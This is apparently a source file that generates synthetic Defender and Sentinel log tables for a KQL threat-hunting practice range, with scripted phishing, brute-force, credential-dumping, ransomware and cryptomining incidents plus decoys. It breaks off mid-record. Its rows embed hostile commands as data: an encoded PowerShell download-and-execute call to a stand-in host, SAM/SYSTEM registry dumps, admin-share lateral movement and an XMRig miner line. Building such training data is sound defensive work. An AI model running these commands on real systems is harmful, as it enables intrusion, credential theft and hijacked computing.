
// Synthetic "Fabrikam" security-log dataset generator for the KQL practice range.
// Deterministic (seeded) so the same dataset is produced every time — required so
// curated scenario answers stay correct.
(function (root) {
  'use strict';

  function mulberry32(seed) {
    let a = seed >>> 0;
    return function () {
      a |= 0; a = (a + 0x6D2B79F5) | 0;
      let t = Math.imul(a ^ (a >>> 15), 1 | a);
      t = (t + Math.imul(t ^ (t >>> 7), 61 | t)) ^ t;
      return ((t ^ (t >>> 14)) >>> 0) / 4294967296;
    };
  }

  const NOW = new Date('2026-09-01T09:00:00Z');

  function iso(hoursAgo, minAgo) {
    minAgo = minAgo || 0;
    return new Date(NOW.getTime() - hoursAgo * 3600000 - minAgo * 60000);
  }

  const DEVICES = [
    { name: 'FAB-FIN-04', dept: 'Finance', user: 'jsmith', domain: 'FABRIKAM' },
    { name: 'FAB-FIN-07', dept: 'Finance', user: 'kwalters', domain: 'FABRIKAM' },
    { name: 'FAB-FIN-11', dept: 'Finance', user: 'rpatel', domain: 'FABRIKAM' },
    { name: 'FAB-HR-02', dept: 'HR', user: 'agomez', domain: 'FABRIKAM' },
    { name: 'FAB-HR-05', dept: 'HR', user: 'lchen', domain: 'FABRIKAM' },
    { name: 'FAB-ENG-01', dept: 'Engineering', user: 'tnowak', domain: 'FABRIKAM' },
    { name: 'FAB-ENG-03', dept: 'Engineering', user: 'dkoval', domain: 'FABRIKAM' },
    { name: 'FAB-ENG-08', dept: 'Engineering', user: 'ssingh', domain: 'FABRIKAM' },
    { name: 'FAB-MKT-02', dept: 'Marketing', user: 'mrivera', domain: 'FABRIKAM' },
    { name: 'FAB-MKT-06', dept: 'Marketing', user: 'ohansen', domain: 'FABRIKAM' },
    { name: 'FAB-IT-01', dept: 'IT', user: 'svc_backup', domain: 'FABRIKAM' },
    { name: 'FAB-EXEC-01', dept: 'Executive', user: 'cwoo', domain: 'FABRIKAM' },
  ];

  const BENIGN_PROCS = [
    { f: 'chrome.exe', folder: 'C:\\Program Files\\Google\\Chrome\\Application', init: 'explorer.exe' },
    { f: 'OUTLOOK.EXE', folder: 'C:\\Program Files\\Microsoft Office\\root\\Office16', init: 'explorer.exe' },
    { f: 'Teams.exe', folder: 'C:\\Users\\%USER%\\AppData\\Local\\Microsoft\\Teams\\current', init: 'explorer.exe' },
    { f: 'EXCEL.EXE', folder: 'C:\\Program Files\\Microsoft Office\\root\\Office16', init: 'explorer.exe' },
    { f: 'WINWORD.EXE', folder: 'C:\\Program Files\\Microsoft Office\\root\\Office16', init: 'explorer.exe' },
    { f: 'OneDrive.exe', folder: 'C:\\Users\\%USER%\\AppData\\Local\\Microsoft\\OneDrive', init: 'explorer.exe' },
    { f: 'notepad.exe', folder: 'C:\\Windows\\System32', init: 'explorer.exe' },
    { f: 'cmd.exe', folder: 'C:\\Windows\\System32', init: 'explorer.exe' },
    { f: 'SearchApp.exe', folder: 'C:\\Windows\\SystemApps\\Microsoft.Windows.Search', init: 'svchost.exe' },
    { f: 'MsMpEng.exe', folder: 'C:\\ProgramData\\Microsoft\\Windows Defender\\Platform', init: 'services.exe' },
  ];

  const BENIGN_DOMAINS = ['login.microsoftonline.com', 'graph.microsoft.com', 'outlook.office365.com',
    'www.google.com', 'github.com', 'teams.microsoft.com', 'fabrikam.sharepoint.com', 'www.linkedin.com',
    'contoso-supplier.example', 'cdn.jsdelivr.net'];

  const BENIGN_SENDERS = [
    { addr: 'newsletter@industryweekly.example', name: 'Industry Weekly', domain: 'industryweekly.example' },
    { addr: 'noreply@fabrikam.example', name: 'Fabrikam IT', domain: 'fabrikam.example' },
    { addr: 'accounts@contoso-supplier.example', name: 'Contoso Supplier Accounts', domain: 'contoso-supplier.example' },
    { addr: 'hr.updates@fabrikam.example', name: 'Fabrikam HR', domain: 'fabrikam.example' },
  ];

  function pick(rng, arr) { return arr[Math.floor(rng() * arr.length)]; }
  function hex(rng, len) { let s = ''; for (let i = 0; i < len; i++) s += Math.floor(rng() * 16).toString(16); return s; }

  // Full confirmed advanced-hunting column sets (Microsoft Learn, defender-xdr docs) per table.
  // Rows are normalized to include every one of these columns (null when unused by a given event)
  // so autocomplete and the schema browser reflect the real schema, not just the columns this
  // generator happens to populate for its storylines.
  const SCHEMA_COLUMNS = {
    DeviceProcessEvents: ['Timestamp', 'DeviceId', 'DeviceName', 'ActionType', 'FileName', 'FolderPath', 'SHA1', 'SHA256',
      'MD5', 'FileSize', 'ProcessId', 'ProcessCommandLine', 'ProcessCreationTime', 'AccountDomain', 'AccountName',
      'AccountSid', 'AccountUpn', 'LogonId', 'InitiatingProcessId', 'InitiatingProcessFileName', 'InitiatingProcessFolderPath',
      'InitiatingProcessCommandLine', 'InitiatingProcessCreationTime', 'InitiatingProcessAccountDomain',
      'InitiatingProcessAccountName', 'InitiatingProcessParentFileName', 'InitiatingProcessParentId',
      'InitiatingProcessSHA1', 'ReportId'],
    DeviceNetworkEvents: ['Timestamp', 'DeviceId', 'DeviceName', 'ActionType', 'RemoteIP', 'RemotePort', 'RemoteUrl',
      'LocalIP', 'LocalPort', 'Protocol', 'LocalIPType', 'RemoteIPType', 'InitiatingProcessId', 'InitiatingProcessFileName',
      'InitiatingProcessFolderPath', 'InitiatingProcessCommandLine', 'InitiatingProcessAccountDomain',
      'InitiatingProcessAccountName', 'ReportId'],
    DeviceFileEvents: ['Timestamp', 'DeviceId', 'DeviceName', 'ActionType', 'FileName', 'FolderPath', 'PreviousFileName',
      'PreviousFolderPath', 'SHA1', 'SHA256', 'MD5', 'FileSize', 'FileOriginUrl', 'FileOriginIP', 'InitiatingProcessId',
      'InitiatingProcessFileName', 'InitiatingProcessFolderPath', 'InitiatingProcessCommandLine',
      'InitiatingProcessAccountDomain', 'InitiatingProcessAccountName', 'RequestAccountName', 'ShareName', 'ReportId'],
    DeviceLogonEvents: ['Timestamp', 'DeviceId', 'DeviceName', 'ActionType', 'LogonType', 'AccountDomain', 'AccountName',
      'AccountSid', 'Protocol', 'FailureReason', 'IsLocalAdmin', 'LogonId', 'RemoteDeviceName', 'RemoteIP', 'RemoteIPType',
      'RemotePort', 'InitiatingProcessId', 'InitiatingProcessFileName', 'InitiatingProcessFolderPath',
      'InitiatingProcessCommandLine', 'InitiatingProcessAccountDomain', 'InitiatingProcessAccountName', 'ReportId'],
    EmailEvents: ['Timestamp', 'NetworkMessageId', 'InternetMessageId', 'SenderMailFromAddress', 'SenderFromAddress',
      'SenderDisplayName', 'SenderObjectId', 'SenderMailFromDomain', 'SenderFromDomain', 'SenderIPv4',
      'RecipientEmailAddress', 'Subject', 'EmailDirection', 'DeliveryAction', 'DeliveryLocation', 'ThreatTypes',
      'ThreatNames', 'DetectionMethods', 'ConfidenceLevel', 'AttachmentCount', 'UrlCount', 'EmailLanguage',
      'EmailAction', 'AuthenticationDetails'],
    // AlertInfo / AlertEvidence: real Defender XDR advanced-hunting tables — one alert-level row per
    // detection (AlertInfo) plus one row per piece of evidence linked to it (AlertEvidence), joined on
    // AlertId. Column lists verified against Microsoft Learn (defender-xdr/advanced-hunting-alertinfo-table
    // and advanced-hunting-alertevidence-table).
    AlertInfo: ['Timestamp', 'AlertId', 'Title', 'Category', 'Severity', 'ServiceSource', 'DetectionSource', 'AttackTechniques'],
    AlertEvidence: ['Timestamp', 'AlertId', 'Title', 'Categories', 'AttackTechniques', 'ServiceSource', 'DetectionSource',
      'EntityType', 'EvidenceRole', 'EvidenceDirection', 'FileName', 'FolderPath', 'SHA1', 'SHA256', 'FileSize',
      'ThreatFamily', 'RemoteIP', 'RemoteUrl', 'AccountName', 'AccountDomain', 'AccountSid', 'AccountObjectId', 'AccountUpn',
      'DeviceId', 'DeviceName', 'LocalIP', 'NetworkMessageId', 'EmailSubject', 'Application', 'ApplicationId',
      'OAuthApplicationId', 'ProcessCommandLine', 'RegistryKey', 'RegistryValueName', 'RegistryValueData',
      'AdditionalFields', 'Severity', 'CloudResource', 'CloudPlatform', 'ResourceType', 'ResourceID', 'SubscriptionId'],
    // ---- Microsoft Sentinel / Microsoft Entra ID tables (added this round) ----
    // Column lists verified against Microsoft Learn's Azure Monitor table reference (SigninLogs,
    // AuditLogs, NetworkAccessTraffic — the real Log Analytics tables Sentinel stores Entra ID data
    // connector output in). Each real table also has a handful of `dynamic` (nested JSON) columns —
    // e.g. SigninLogs.DeviceDetail/LocationDetails, AuditLogs.InitiatedBy/TargetResources — that this
    // practice engine deliberately omits rather than guess at flattened substitute column names, since
    // the engine has no dynamic/JSON member-access support. Every column actually listed below is a
    // real, flat (non-dynamic) column with its real Microsoft Learn name and meaning.
    // RiskEventTypes_V2 added this round: the real Azure Monitor SigninLogs column naming WHICH Entra ID
    // Protection risk detection(s) fired on a sign-in (e.g. "anonymizedIPAddress", "unfamiliarFeatures",
    // "unlikelyTravel") — distinct from RiskLevelDuringSignIn (HOW risky) and IsRisky (a bare flag).
    // Verified against Microsoft Learn's Azure Monitor SigninLogs table reference; existing rows that
    // don't set this field are left null by normalize() below, same convention as every other optional
    // column in this schema.
    SigninLogs: ['TimeGenerated', 'CreatedDateTime', 'Id', 'UserPrincipalName', 'UserDisplayName', 'UserId', 'UserType', 'AppDisplayName',
      'IPAddress', 'Location', 'ResultType', 'ResultDescription', 'ConditionalAccessStatus', 'IsInteractive', 'IsRisky',
      'RiskLevelDuringSignIn', 'RiskEventTypes_V2', 'ClientAppUsed', 'AuthenticationRequirement', 'CorrelationId'],
    AuditLogs: ['TimeGenerated', 'ActivityDateTime', 'Id', 'OperationName', 'ActivityDisplayName', 'Category',
      'AADOperationType', 'Result', 'ResultDescription', 'ResultReason', 'Identity', 'Location', 'LoggedByService',
      'CorrelationId'],
    NetworkAccessTraffic: ['TimeGenerated', 'TransactionId', 'UserPrincipalName', 'UserId', 'Action', 'SourceIp',
      'SourcePort', 'DestinationIp', 'DestinationFqdn', 'DestinationPort', 'DestinationUrl', 'TransportProtocol',
      'DeviceId', 'DeviceOperatingSystem', 'CloudAppName', 'CloudAppCategory', 'TrafficType', 'AccessType',
      'PolicyName', 'ThreatType', 'SentBytes', 'ReceivedBytes'],
  };

  function normalize(rows, columns, deviceIdOf) {
    return rows.map(r => {
      const o = {};
      for (const c of columns) o[c] = (c in r) ? r[c] : null;
      if ('DeviceId' in o && o.DeviceId === null && o.DeviceName && deviceIdOf) o.DeviceId = deviceIdOf(o.DeviceName);
      return o;
    });
  }

  function buildDataset() {
    const rng = mulberry32(1337);
    const DeviceProcessEvents = [];
    const DeviceNetworkEvents = [];
    const DeviceFileEvents = [];
    const DeviceLogonEvents = [];
    const EmailEvents = [];
    const AlertInfo = [];
    const AlertEvidence = [];

    // ---------- Benign noise across the last 5 days ----------
    for (let i = 0; i < 420; i++) {
      const dev = pick(rng, DEVICES);
      const proc = pick(rng, BENIGN_PROCS);
      const hoursAgo = rng() * 120; // up to 5 days back
      const ts = iso(hoursAgo);
      const pid = 1000 + Math.floor(rng() * 8000);
      DeviceProcessEvents.push({
        Timestamp: ts, DeviceName: dev.name, ActionType: 'ProcessCreated',
        FileName: proc.f, FolderPath: proc.folder.replace('%USER%', dev.user),
        SHA1: hex(rng, 40), ProcessId: pid,
        ProcessCommandLine: proc.f,
        AccountDomain: dev.domain, AccountName: dev.user,
        InitiatingProcessFileName: proc.init, InitiatingProcessAccountName: dev.user,
      });
    }
    for (let i = 0; i < 300; i++) {
      const dev = pick(rng, DEVICES);
      const domain = pick(rng, BENIGN_DOMAINS);
      const hoursAgo = rng() * 120;
      DeviceNetworkEvents.push({
        Timestamp: iso(hoursAgo), DeviceName: dev.name, ActionType: 'ConnectionSuccess',
        RemoteIP: `20.${Math.floor(rng() * 200) + 1}.${Math.floor(rng() * 200)}.${Math.floor(rng() * 254) + 1}`,
        RemotePort: 443, RemoteUrl: domain, Protocol: 'Tcp',
        InitiatingProcessFileName: pick(rng, BENIGN_PROCS).f, InitiatingProcessAccountName: dev.user,
      });
    }
    for (let i = 0; i < 220; i++) {
      const dev = pick(rng, DEVICES);
      const hoursAgo = rng() * 120;
      const names = ['Q3-report.xlsx', 'meeting-notes.docx', 'budget.xlsx', 'onboarding.pdf', 'roadmap.pptx', 'timesheet.xlsx'];
      DeviceFileEvents.push({
        Timestamp: iso(hoursAgo), DeviceName: dev.name, ActionType: pick(rng, ['FileCreated', 'FileModified']),
        FileName: pick(rng, names), FolderPath: `C:\\Users\\${dev.user}\\Documents`,
        SHA1: hex(rng, 40), FileSize: Math.floor(rng() * 500000) + 1000,
        InitiatingProcessFileName: pick(rng, BENIGN_PROCS).f, InitiatingProcessAccountName: dev.user,
      });
    }
    for (let i = 0; i < 260; i++) {
      const dev = pick(rng, DEVICES);
      const hoursAgo = rng() * 120;
      DeviceLogonEvents.push({
        Timestamp: iso(hoursAgo), DeviceName: dev.name, ActionType: 'LogonSuccess',
        LogonType: 'Interactive', AccountDomain: dev.domain, AccountName: dev.user,
        RemoteIP: '', IsLocalAdmin: false,
      });
    }
    for (let i = 0; i < 180; i++) {
      const dev = pick(rng, DEVICES);
      const sender = pick(rng, BENIGN_SENDERS);
      const hoursAgo = rng() * 120;
      const subjects = ['Weekly newsletter', 'Your invoice is attached', 'Team meeting notes', 'HR: benefits enrollment reminder', 'Project roadmap update'];
      EmailEvents.push({
        Timestamp: iso(hoursAgo), NetworkMessageId: hex(rng, 32),
        SenderFromAddress: sender.addr, SenderDisplayName: sender.name, SenderFromDomain: sender.domain,
        RecipientEmailAddress: `${dev.user}@fabrikam.example`, Subject: pick(rng, subjects),
        DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox/Folder',
        ThreatTypes: '', DetectionMethods: '', AttachmentCount: rng() > 0.6 ? 1 : 0, UrlCount: rng() > 0.7 ? 1 : 0,
      });
    }

    // ---------- Incident A: phishing -> macro -> PowerShell -> C2 beacon (FAB-FIN-07 / kwalters) ----------
    const aBase = iso(20); // ~20 hours ago
    EmailEvents.push({
      Timestamp: aBase, NetworkMessageId: 'a1c9f0e2b3d4a5f6e7c8b9a0d1e2f3a4',
      SenderFromAddress: 'billing@invoice-alerts-secure.example', SenderDisplayName: 'Vendor Billing',
      SenderFromDomain: 'invoice-alerts-secure.example',
      RecipientEmailAddress: 'kwalters@fabrikam.example', Subject: 'URGENT: Overdue Invoice #4471 - Action Required',
      DeliveryAction: 'Delivered', DeliveryLocation: 'Inbox/Folder',
      ThreatTypes: 'Phish', DetectionMethods: 'Mail rule', AttachmentCount: 1, UrlCount: 0,
    });
    DeviceFileEvents.push({
      Timestamp: new Date(aBase.getTime() + 6 * 60000), DeviceName: 'FAB-FIN-07', ActionType: 'FileCreated',
      FileName: 'Invoice_4471.xlsm', FolderPath: 'C:\\Users\\kwalters\\Downloads',
      SHA1: 'b7e2a1c4d5f6a7b8c9d0e1f2a3b4c5d6e7f8a9b0', FileSize: 88213,
      InitiatingProcessFileName: 'OUTLOOK.EXE', InitiatingProcessAccountName: 'kwalters',
    });
    DeviceProcessEvents.push({
      Timestamp: new Date(aBase.getTime() + 9 * 60000), DeviceName: 'FAB-FIN-07', ActionType: 'ProcessCreated',
      FileName: 'powershell.exe', FolderPath: 'C:\\Windows\\System32\\WindowsPowerShell\\v1.0',
      SHA1: '9f8e7d6c5b4a39281706f5e4d3c2b1a0918273645', ProcessId: 6188,
      ProcessCommandLine: 'powershell.exe -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAcwA6AC8ALwBjAGQAbgAtAHUAcABkAGEAdABlAC0AZABlAGwAaQB2AGUAcgB5AC4AbgBlAHQAJwApAA==',
      AccountDomain: 'FABRIKAM', AccountName: 'kwalters',
      InitiatingProcessFileName: 'EXCEL.EXE', InitiatingProcessAccountName: 'kwalters',
      InitiatingProcessCommandLine: '"C:\\Program Files\\Microsoft Office\\root\\Office16\\EXCEL.EXE" /n "C:\\Users\\kwalters\\Downloads\\Invoice_4471.xlsm"',
    });
    DeviceNetworkEvents.push({
      Timestamp: new Date(aBase.getTime() + 10 * 60000), DeviceName: 'FAB-FIN-07', ActionType: 'ConnectionSuccess',
      RemoteIP: '203.0.113.55', RemotePort: 443, RemoteUrl: 'cdn-update-delivery.net', Protocol: 'Tcp',
      InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: 'kwalters',
    });
    DeviceFileEvents.push({
      Timestamp: new Date(aBase.getTime() + 11 * 60000), DeviceName: 'FAB-FIN-07', ActionType: 'FileCreated',
      FileName: 'svchost32_update.dll', FolderPath: 'C:\\Users\\kwalters\\AppData\\Roaming',
      SHA1: '1a2b3c4d5e6f7089a1b2c3d4e5f60718293a4b5c', FileSize: 41216,
      InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: 'kwalters',
    });
    for (let i = 1; i <= 5; i++) {
      DeviceNetworkEvents.push({
        Timestamp: new Date(aBase.getTime() + (10 + i * 32) * 60000), DeviceName: 'FAB-FIN-07', ActionType: 'ConnectionSuccess',
        RemoteIP: '203.0.113.55', RemotePort: 443, RemoteUrl: 'cdn-update-delivery.net', Protocol: 'Tcp',
        InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: 'kwalters',
      });
    }

    // ---------- Incident B: brute-forced service account -> admin logon from external IP (FAB-IT-01 / svc_backup) ----------
    const bBase = iso(46); // ~2 days ago
    for (let i = 0; i < 7; i++) {
      DeviceLogonEvents.push({
        Timestamp: new Date(bBase.getTime() + i * 45000), DeviceName: 'FAB-IT-01', ActionType: 'LogonFailed',
        LogonType: 'Network', AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
        RemoteIP: '198.51.100.23', IsLocalAdmin: false, FailureReason: 'Unknown user name or bad password',
      });
    }
    DeviceLogonEvents.push({
      Timestamp: new Date(bBase.getTime() + 7 * 45000 + 20000), DeviceName: 'FAB-IT-01', ActionType: 'LogonSuccess',
      LogonType: 'Network', AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      RemoteIP: '198.51.100.23', IsLocalAdmin: true,
    });
    DeviceProcessEvents.push({
      Timestamp: new Date(bBase.getTime() + 7 * 45000 + 60000), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'whoami.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(42), 40), ProcessId: 7212, ProcessCommandLine: 'whoami /all',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessAccountName: 'svc_backup',
    });
    DeviceProcessEvents.push({
      Timestamp: new Date(bBase.getTime() + 7 * 45000 + 90000), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'net.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(43), 40), ProcessId: 7301, ProcessCommandLine: 'net group "Domain Admins" /domain',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessAccountName: 'svc_backup',
    });

    // ---------- Incident D: credential dumping + lateral movement to FAB-EXEC-01, continuing Incident B
    // (svc_backup, already admin on FAB-IT-01, dumps SAM/SYSTEM via reg.exe then pivots over SMB — the
    // credential-dumping + admin-share lateral-movement pattern Cisco Talos's Q1 2026 IR Trends report
    // flags as the top techniques in those ATT&CK categories) ----------
    DeviceProcessEvents.push({
      Timestamp: new Date(bBase.getTime() + 7 * 45000 + 150000), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'reg.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(88), 40), ProcessId: 7355, ProcessCommandLine: 'reg.exe save HKLM\\SAM C:\\Windows\\Temp\\sam.save',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessAccountName: 'svc_backup',
    });
    DeviceProcessEvents.push({
      Timestamp: new Date(bBase.getTime() + 7 * 45000 + 165000), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'reg.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(89), 40), ProcessId: 7358, ProcessCommandLine: 'reg.exe save HKLM\\SYSTEM C:\\Windows\\Temp\\system.save',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessAccountName: 'svc_backup',
    });
    DeviceProcessEvents.push({
      Timestamp: new Date(bBase.getTime() + 7 * 45000 + 200000), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
      FileName: 'net.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(90), 40), ProcessId: 7362, ProcessCommandLine: 'net use \\\\FAB-EXEC-01\\C$ /user:FABRIKAM\\svc_backup',
      AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      InitiatingProcessFileName: 'cmd.exe', InitiatingProcessAccountName: 'svc_backup',
    });
    DeviceNetworkEvents.push({
      Timestamp: new Date(bBase.getTime() + 7 * 45000 + 205000), DeviceName: 'FAB-IT-01', ActionType: 'ConnectionSuccess',
      RemoteIP: '10.20.0.31', RemotePort: 445, RemoteUrl: 'FAB-EXEC-01', Protocol: 'Tcp',
      InitiatingProcessFileName: 'net.exe', InitiatingProcessAccountName: 'svc_backup',
    });
    DeviceLogonEvents.push({
      Timestamp: new Date(bBase.getTime() + 7 * 45000 + 210000), DeviceName: 'FAB-EXEC-01', ActionType: 'LogonSuccess',
      LogonType: 'Network', AccountDomain: 'FABRIKAM', AccountName: 'svc_backup',
      RemoteIP: '10.20.0.11', RemoteDeviceName: 'FAB-IT-01', IsLocalAdmin: true,
    });

    // ---------- Incident C: mass file-rename spike, ransomware-like (FAB-ENG-03 / dkoval) ----------
    const cBase = iso(8); // ~8 hours ago
    DeviceProcessEvents.push({
      Timestamp: cBase, DeviceName: 'FAB-ENG-03', ActionType: 'ProcessCreated',
      FileName: 'svchost32.exe', FolderPath: 'C:\\Users\\dkoval\\AppData\\Local\\Temp',
      SHA1: hex(mulberry32(77), 40), ProcessId: 4410, ProcessCommandLine: 'svchost32.exe --encrypt-mode',
      AccountDomain: 'FABRIKAM', AccountName: 'dkoval',
      InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'dkoval',
    });
    const engFiles = ['design_spec.docx', 'build_pipeline.yaml', 'schema.sql', 'roadmap_2026.pptx', 'test_results.csv',
      'architecture.vsdx', 'release_notes.md', 'inventory.xlsx', 'client_data.csv', 'source_backup.zip',
      'diagram.png', 'notes.txt', 'presentation.pptx', 'contract_draft.docx', 'db_dump.sql'];
    engFiles.forEach((fn, idx) => {
      DeviceFileEvents.push({
        Timestamp: new Date(cBase.getTime() + 60000 + idx * 4000), DeviceName: 'FAB-ENG-03', ActionType: 'FileRenamed',
        FileName: fn + '.locked', PreviousFileName: fn, FolderPath: 'C:\\Users\\dkoval\\Documents\\Projects',
        SHA1: hex(mulberry32(200 + idx), 40), FileSize: Math.floor(rng() * 900000) + 5000,
        InitiatingProcessFileName: 'svchost32.exe', InitiatingProcessAccountName: 'dkoval',
      });
    });

    // ---------- Ground truth for Detection Lab: exact timestamps of every event that is part of
    // Incidents A/B/C/D above (never benign noise, never a decoy) — computed directly from the same
    // base timestamps and fixed offsets used to create those events above, so it can't drift out of
    // sync with them. Used only to score a user-written detection query's precision/recall; never
    // exposed to the query engine or the UI as a column. ----------
    const MALICIOUS_TS = {
      DeviceProcessEvents: [
        new Date(aBase.getTime() + 9 * 60000).getTime(),                  // Incident A: malicious PowerShell
        new Date(bBase.getTime() + 7 * 45000 + 60000).getTime(),          // Incident B: whoami /all
        new Date(bBase.getTime() + 7 * 45000 + 90000).getTime(),          // Incident B: net group Domain Admins
        new Date(bBase.getTime() + 7 * 45000 + 150000).getTime(),         // Incident D: reg.exe save SAM
        new Date(bBase.getTime() + 7 * 45000 + 165000).getTime(),         // Incident D: reg.exe save SYSTEM
        new Date(bBase.getTime() + 7 * 45000 + 200000).getTime(),         // Incident D: net use lateral
        cBase.getTime(),                                                   // Incident C: svchost32.exe --encrypt-mode
      ],
      DeviceNetworkEvents: [
        new Date(aBase.getTime() + 10 * 60000).getTime(),                 // Incident A: first C2 beacon
        ...[1, 2, 3, 4, 5].map(i => new Date(aBase.getTime() + (10 + i * 32) * 60000).getTime()), // Incident A: beacon repeats
        new Date(bBase.getTime() + 7 * 45000 + 205000).getTime(),         // Incident D: SMB hop to FAB-EXEC-01
      ],
      DeviceFileEvents: [
        new Date(aBase.getTime() + 6 * 60000).getTime(),                  // Incident A: malicious .xlsm dropped
        new Date(aBase.getTime() + 11 * 60000).getTime(),                 // Incident A: dropped DLL
        ...engFiles.map((fn, idx) => new Date(cBase.getTime() + 60000 + idx * 4000).getTime()), // Incident C: all 15 renames
      ],
      DeviceLogonEvents: [
        ...[0, 1, 2, 3, 4, 5, 6].map(i => new Date(bBase.getTime() + i * 45000).getTime()), // Incident B: 7 failed logons
        new Date(bBase.getTime() + 7 * 45000 + 20000).getTime(),          // Incident B: successful brute-force logon
        new Date(bBase.getTime() + 7 * 45000 + 210000).getTime(),         // Incident D: lateral logon to FAB-EXEC-01
      ],
      EmailEvents: [
        aBase.getTime(),                                                   // Incident A: phishing email
      ],
    };

    // Finer-grained ground truth for Detection Lab: one specific technique's rows only (not "any
    // malicious row"), so a detection query is scored against exactly what it was asked to find —
    // including, for the registry-save target, a real decoy row in the SAME table to catch overly
    // broad detections.
    const GROUND_TRUTH = {
      officeToPowerShell: {
        table: 'DeviceProcessEvents',
        ts: [new Date(aBase.getTime() + 9 * 60000).getTime()],
      },
      credentialDumpRegistry: {
        table: 'DeviceProcessEvents',
        ts: [
          new Date(bBase.getTime() + 7 * 45000 + 150000).getTime(),
          new Date(bBase.getTime() + 7 * 45000 + 165000).getTime(),
        ],
      },
    };

    // ---------- Decoys: benign activity that LOOKS like an incident pattern at a glance, so filtering
    // on one signal alone isn't enough — the same realism gap real analysts fight daily ----------
    // A legitimate backup job also runs reg.exe save — but against a different hive, different account,
    // on a schedule (every night at the same minute), never against SAM/SYSTEM.
    for (let d = 1; d <= 4; d++) {
      DeviceProcessEvents.push({
        Timestamp: iso(24 * d + 0.05), DeviceName: 'FAB-IT-01', ActionType: 'ProcessCreated',
        FileName: 'reg.exe', FolderPath: 'C:\\Windows\\System32',
        SHA1: hex(mulberry32(500 + d), 40), ProcessId: 5100 + d,
        ProcessCommandLine: 'reg.exe save HKLM\\SOFTWARE\\Veeam C:\\ProgramData\\Veeam\\config_' + d + '.reg',
        AccountDomain: 'FABRIKAM', AccountName: 'svc_veeam',
        InitiatingProcessFileName: 'VeeamAgent.exe', InitiatingProcessAccountName: 'svc_veeam',
      });
    }
    // Ordinary SMB file-share access between two other devices — same port 445 signature as the
    // FAB-IT-01 -> FAB-EXEC-01 lateral-movement hop, but routine and nowhere near either incident.
    for (let d = 1; d <= 3; d++) {
      DeviceNetworkEvents.push({
        Timestamp: iso(24 * d + 2), DeviceName: 'FAB-ENG-01', ActionType: 'ConnectionSuccess',
        RemoteIP: '10.20.0.40', RemotePort: 445, RemoteUrl: 'FAB-FILE-01', Protocol: 'Tcp',
        InitiatingProcessFileName: 'explorer.exe', InitiatingProcessAccountName: 'tnowak',
      });
    }

    // ---------- Incident F: cryptomining after AI-orchestrator exploitation (FAB-ENG-08 / ssingh) —
    // grounded in CISA's Known Exploited Vulnerabilities catalog update of September 3, 2026 (seven flaws
    // added, including auth-bypass/OS-command-injection bugs in self-hosted AI-workflow tooling — Kestra
    // OSS, Berri LiteLLM), which multiple outlets reported was already being used in the wild to drop
    // reverse shells and deploy XMRig cryptominers post-exploitation. Fabrikam Engineering self-hosts one
    // of the affected orchestrator types (modeled here as a Kestra-style Java process). XMRig's real,
    // documented CLI flags (-o pool url, -u wallet/user, -p password, --donate-level) and its
    // stratum+tcp:// pool-URL scheme are both confirmed via xmrig.com/docs/miner/command-line-options and
    // xmrig.com/docs/miner/config/pool — not guessed. Fictional pool IP uses the RFC 5737 TEST-NET-2 range
    // (198.51.100.0/24), matching the convention already used elsewhere in this dataset. ----------
    const fBase = iso(3); // ~3 hours ago
    DeviceProcessEvents.push({
      Timestamp: fBase, DeviceName: 'FAB-ENG-08', ActionType: 'ProcessCreated',
      FileName: 'cmd.exe', FolderPath: 'C:\\Windows\\System32',
      SHA1: hex(mulberry32(701), 40), ProcessId: 8801,
      ProcessCommandLine: 'cmd.exe /c powershell -nop -w hidden -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQA',
      AccountDomain: 'FABRIKAM', AccountName: 'ssingh',
      InitiatingProcessFileName: 'java.exe', InitiatingProcessFolderPath: 'C:\\Kestra\\bin',
      InitiatingProcessCommandLine: 'java.exe -jar kestra.jar server standalone', InitiatingProcessAccountName: 'ssingh',
    });
    const xmrigTs = new Date(fBase.getTime() + 90000);
    DeviceProcessEvents.push({
      Timestamp: xmrigTs, DeviceName: 'FAB-ENG-08', ActionType: 'ProcessCreated',
      FileName: 'xmrig.exe', FolderPath: 'C:\\ProgramData\\Intel\\Update',
      SHA1: hex(mulberry32(702), 40), ProcessId: 8830,
      ProcessCommandLine: 'xmrig.exe -o stratum+tcp://relay-pool-sync.net:4444 -u 48fakeWalletForTrainingOnly0000000000000000000000000000000000 -p x --donate-level=1',
      AccountDomain: 'FABRIKAM', AccountName: 'ssingh',
      InitiatingProcessFileName: 'powershell.exe', InitiatingProcessAccountName: 'ssingh',
    });
    DeviceNetworkEvents.push({
      Timestamp: new Date(xmrigTs.getTime() + 5000), DeviceName: 'FAB-ENG-08', ActionType: 'ConnectionSuccess',
